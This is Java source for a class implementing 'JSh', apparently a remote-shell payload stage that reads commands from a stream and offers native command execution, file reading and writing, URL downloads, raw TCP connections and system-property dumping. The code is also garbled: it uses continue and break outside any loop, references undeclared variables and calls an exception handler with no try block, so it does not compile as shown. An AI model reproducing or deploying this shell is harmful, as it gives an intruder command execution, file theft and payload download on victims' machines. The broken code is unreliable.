public class func{
public void start(DataInputStream originalIn,OutputStream out,String[] parameters){
      String cmd = in.readLine();
      while (cmd.indexOf("\0$") != -1) {
        cmd = cmd.substring(0, cmd.indexOf("\0$")) + cmd.substring(cmd.indexOf("\0$") + 2);
      }
      if (cmd.length() == 0) {
        continue;
      }
      int pos = cmd.indexOf(' ');
      if (pos != -1) {
        params = cmd.substring(pos + 1);
        cmd = cmd.substring(0, pos);
      }
      cmd = cmd.toLowerCase().intern();
        if (cmd == "cd" || cmd == "cat" || cmd == "paste") {
          fp = new File(params);
          if (!fp.isAbsolute())
            fp = new File(pwd, params);
        }
        if (cmd == "info") {
          if (params.length() == 0) {
            final Enumeration e = System.getProperties().propertyNames();
            while (e.hasMoreElements()) {
              final String property = (String) e.nextElement();
              pout.println(property + "=" + System.getProperty(property));
            }
          } else {
            pout.println(params + "=" + System.getProperty(params));
          }
        } else if (cmd == "pwd") {
          pout.println(pwd.getPath());
        } else if (cmd == "cd") {
          if (fp.exists() && fp.isDirectory()) {
            pwd = fp.getCanonicalFile();
          } else {
            pout.println("Path not found.");
          }
          pout.println(pwd.getPath());
        } else if (cmd == "ls") {
          final File[] roots = File.listRoots();
          for (int i = 0; i < roots.length; i++) {
            pout.println(roots[i].getAbsolutePath() + "\t[ROOT]");
          }
          pout.println();
          final File[] dir = pwd.listFiles();
          for (int i = 0; i < dir.length; i++) {
            pout.println(dir[i].getName() + "\t" + (dir[i].isDirectory() ? "[DIR]" : "" + dir[i].length()) + "\t" + new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(dir[i].lastModified())));
          }
        } else if (cmd == "exec") {
          Process proc;
          handleBackgroundJob(in, new Object[] { "exec " + params, proc = Runtime.getRuntime().exec(params), proc.getOutputStream(), new JShStreamForwarder(proc.getInputStream(), pout, ss), new JShStreamForwarder(proc.getErrorStream(), pout, ss) });
        } else if (cmd == "cat") {
          final FileInputStream fis = new FileInputStream(fp);
          forward(fis, pout);
        } else if (cmd == "wget") {
          pos = params.indexOf(' ');
          if (pos == -1) {
            pout.println("  Usage: wget <URL> <filename>");
          } else {
            File f = new File(params.substring(pos + 1));
            if (!f.isAbsolute())
              f = new File(pwd, params.substring(pos + 1));
            final FileOutputStream fos = new FileOutputStream(f);
            forward(new URL(params.substring(0, pos)).openStream(), fos);
            fos.close();
          }
        } else if (cmd == "telnet") {
          pos = params.indexOf(' ');
          if (pos == -1) {
            pout.println("  Usage: telnet <host> <port>");
          } else {
            Socket s;
            handleBackgroundJob(in, new Object[] { "telnet " + params, s = new Socket(params.substring(0, pos), Integer.parseInt(params.substring(pos + 1))), s.getOutputStream(), new JShStreamForwarder(s.getInputStream(), pout, ss) });
          }
        } else if (cmd == "paste") {
          FileOutputStream fos;
          handleBackgroundJob(in, new Object[] { "paste " + params, fos = new FileOutputStream(fp), fos });
        } else if (cmd == "jobs") {
          if (params.length() == 0) {
            for (int i = 0; i < jobs.size(); i++) {
              pout.println((i + 1) + "\t" + ((Object[]) jobs.get(i))[0]);
            }
          } else {
            handleBackgroundJob(in, (Object[]) jobs.remove(Integer.parseInt(params) - 1));
          }
        } else if (cmd == "exit") {
          break;
        } else if (cmd == "help") {
          params = params.toLowerCase().intern();
          if (params == "info") {
            pout.println("info: show system properties.");
            pout.println("  Usage: info [property]");
          } else if (params == "pwd") {
            pout.println("pwd: show current directory.");
            pout.println("  Usage: pwd");
          } else if (params == "cd") {
            pout.println("cd: change directory.");
            pout.println("  Usage: cd <path>");
          } else if (params == "ls") {
            pout.println("ls: list directory.");
            pout.println("  Usage: ls");
          } else if (params == "exec") {
            pout.println("exec: execute native command.");
            pout.println("  Usage: exec <command>");
          } else if (params == "cat") {
            pout.println("cat: show text file.");
            pout.println("  Usage: cat <filename>");
          } else if (params == "wget") {
            pout.println("wget: download file.");
            pout.println("  Usage: wget <URL> <filename>");
          } else if (params == "telnet") {
            pout.println("telnet: create TCP connection.");
            pout.println("  Usage: telnet <host> <port>");
          } else if (params == "paste") {
            pout.println("paste: create text file.");
            pout.println("  Usage: paste <filename>");
          } else if (params == "jobs") {
            pout.println("jobs: list or continue jobs.");
            pout.println("  Usage: jobs [index]");
          } else if (params == "exit") {
            pout.println("exit: Exit JSh.");
            pout.println("  Usage: exit");
          } else {
            pout.println("help: show information about commands.");
            pout.println("  Usage: help [command]");
            pout.println();
            pout.println("Supported commands:");
            pout.println("    help   - show this help");
            pout.println("    info   - list system properties");
            pout.println("    pwd    - show current directory");
            pout.println("    cd     - change directory");
            pout.println("    ls     - list directory");
            pout.println("    exec   - execute native command");
            pout.println("    cat    - show text file");
            pout.println("    wget   - download file");
            pout.println("    telnet - create TCP connection");
            pout.println("    paste  - create text file");
            pout.println("    jobs   - list or continue jobs");
            pout.println("    exit   - Exit JSh");
            pout.println();
            pout.println("When inside an interactive command, enter ~. on a new");
            pout.println("line to exit from that command. Enter ~& to background the command.");
            pout.println("Enter ~~ to start a line with a ~ character");
          }
        } else {
          pout.println("Unknown command: " + cmd);
          pout.println("Type help for more info.");
        }
        ex.printStackTrace(pout);
}
}
